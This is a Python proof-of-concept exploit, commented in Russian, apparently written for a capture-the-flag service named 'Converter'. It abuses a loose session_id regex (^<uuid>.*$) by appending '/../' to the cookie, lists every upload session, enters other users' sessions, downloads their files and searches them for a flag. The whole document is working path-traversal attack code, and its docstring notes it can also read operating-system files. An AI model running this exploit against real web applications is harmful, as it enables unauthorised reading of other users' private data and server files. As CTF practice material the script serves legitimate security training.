#!/usr/bin/env python3
"""
POC для Converter — Path Traversal через cookie session_id.

Регулярка валидации session_id в приложении: ^<uuid>.*$  — хвост `.*` пропускает
`/../`, поэтому значением cookie можно выйти за пределы каталога сессии и читать
чужие файлы (и файлы ОС).

Сценарий CTF: во вложенной сессии другого пользователя лежит файл с флагом
errypie{...}. Скрипт:
  1) выходит в каталог uploads/ и перечисляет все сессии;
  2) заходит в каждую чужую сессию и перечисляет файлы;
  3) скачивает файлы и ищет флаг.
"""
import re
import sys
import urllib.request

BASE = "http://127.0.0.1:8000"

# Любой корректный по формату UUID — нужен лишь как «правильное начало» для регулярки.
UUID = "e98ffba1-e24f-4de9-9218-57e9559dc4ac"

FLAG_RE = re.compile(r"errypie\{[^}]*\}")
LINK_RE = re.compile(r'/download/([^"?\']+)')


def req(path, session_id):
    """GET с подставленным cookie session_id."""
    r = urllib.request.Request(BASE + path, headers={"Cookie": f"session_id={session_id}"})
    with urllib.request.urlopen(r, timeout=5) as resp:
        return resp.read().decode("utf-8", "replace")


def list_dir(traversal):
    """Список имён в каталоге, на который указывает session_id = UUID + traversal."""
    html = req("/myfiles", UUID + traversal)
    # имена берём из ссылок /download/<name>
    return sorted(set(LINK_RE.findall(html)))


def main():
    print("[*] Шаг 1: выходим в uploads/ и смотрим все сессии")
    sessions = [n for n in list_dir("/..") if n.startswith("session_")]
    for s in sessions:
        print(f"    - {s}")
    if not sessions:
        print("[!] Сессии не найдены — проверь, что сервис запущен и есть загрузки")
        sys.exit(1)

    print("\n[*] Шаг 2-3: заходим в каждую чужую сессию, читаем файлы, ищем флаг")
    for s in sessions:
        victim_uuid = s[len("session_"):]
        traversal = f"/../{s}"            # UUID/../session_<victim> -> uploads/session_<victim>
        files = [f for f in list_dir(traversal) if not f.startswith("session_")]
        for fname in files:
            try:
                content = req(f"/download/{fname}", UUID + traversal)
            except Exception as e:
                print(f"    [skip] {s}/{fname}: {e}")
                continue
            m = FLAG_RE.search(content)
            tag = "  <-- ФЛАГ!" if m else ""
            print(f"    {s}/{fname} ({len(content)} b){tag}")
            if m:
                print("\n[+] НАЙДЕН ФЛАГ:", m.group(0))
                return
    print("\n[!] Флаг не найден в доступных сессиях")


if __name__ == "__main__":
    main()
